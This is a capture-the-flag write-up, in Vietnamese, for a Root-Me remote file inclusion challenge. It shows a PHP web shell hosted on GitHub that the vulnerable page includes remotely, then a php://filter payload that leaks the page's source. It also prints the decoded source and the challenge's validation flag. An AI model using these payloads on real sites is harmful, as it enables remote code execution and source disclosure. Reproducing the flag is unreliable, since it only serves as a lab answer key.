# [Remote File Inclusion](https://www.root-me.org/en/Challenges/Web-Server/Remote-File-Inclusion)

## Solutions

Quan sát thấy

- query parameter `?lang=en` thì có gọi hàm include file `en_lang.php`
- không sử dụng null byte được

Tạo một file có tên `a_lang.php` trên github, lấy link raw: `https://raw.githubusercontent.com/hoanghailongvn/test/main/a_lang.php` với nội dung:

```php
<?php
 system($_GET['command']);
?>
```

=> query: `?lang=https://raw.githubusercontent.com/hoanghailongvn/test/main/a`

- Lỗi: `Warning: system() has been disabled for security reasons in https://raw.githubusercontent.com/hoanghailongvn/test/main/a_lang.php on line 2`

Thay đổi nội dung file `a_lang.php`:

```php
<?php
 include('php://filter/convert.base64-encode/resource=index.php');
?>
```

Base64 decode sẽ lấy được nội dung file index.php:

```bash
┌──(kali㉿kali)-[~/Documents/test]
└─$ echo 'PD9waHAKCi8qCgpDb25ncmF0eiEKCkxlIG1vdCBkZSBwYXNzZSBkZSB2YWxpZGF0aW9uIGVzdCA6IApUaGUgdmFsaWRhdGlvbiBwYXNzd29yZCBpcyA6IAoKUjNtMHQzX2lTX3IzYUwxeV8zdjFsCgoqLwoKJGxhbmd1YWdlPSJlbiI7Cml
mICggaXNzZXQoJF9HRVRbImxhbmciXSkgKXsKICAgICRsYW5ndWFnZSA9ICRfR0VUWyJsYW5nIl07Cn0KaW5jbHVkZSgkbGFuZ3VhZ2UuIl9sYW5nLnBocCIpOwo/PgoKPGh0bWw+CjxoZWFkPjx0aXRsZT5SZW1vdGUgRmlsZSBJbmNsdXNpb248L3Rp
dGxlPjwvaGVhZD4KCjxib2R5PgoKPGgzPgogICAgPD9waHAgZWNobyAkbGFuZ1snbGFuZyddOyA/PiA6IAogICAgPGEgaHJlZj0iP2xhbmc9ZnIiIHN0eWxlPSJ0ZXh0LWRlY29yYXRpb246PD9waHAgKCRsYW5ndWFnZT09ImZyIik/cHJpbnQgInVuZ
GVybGluZSI6cHJpbnQgIm5vbmUiOyA/PiI+RnJhbsOnYWlzPC9hPgogICAgJm5ic3A7fCZuYnNwOwogICAgPGEgaHJlZj0iP2xhbmc9ZW4iIHN0eWxlPSJ0ZXh0LWRlY29yYXRpb246PD9waHAgKCRsYW5ndWFnZT09ImVuIik/cHJpbnQgInVuZGVybG
luZSI6cHJpbnQgIm5vbmUiOyA/PiI+RW5nbGlzaDwvYT4KPC9oMz4KCjxwPjw/cGhwIGVjaG8gJGxhbmdbIndlbGNvbWUiXTsgPz48L3A+Cgo8L2JvZHk+CjwvaHRtbD4K' | base64 -d
<?php

/*

Congratz!

Le mot de passe de validation est : 
The validation password is : 

R3m0t3_iS_r3aL1y_3v1l

*/

$language="en";
if ( isset($_GET["lang"]) ){
    $language = $_GET["lang"];
}
include($language."_lang.php");
?>

<html>
<head><title>Remote File Inclusion</title></head>
...
```

Flag: `R3m0t3_iS_r3aL1y_3v1l`
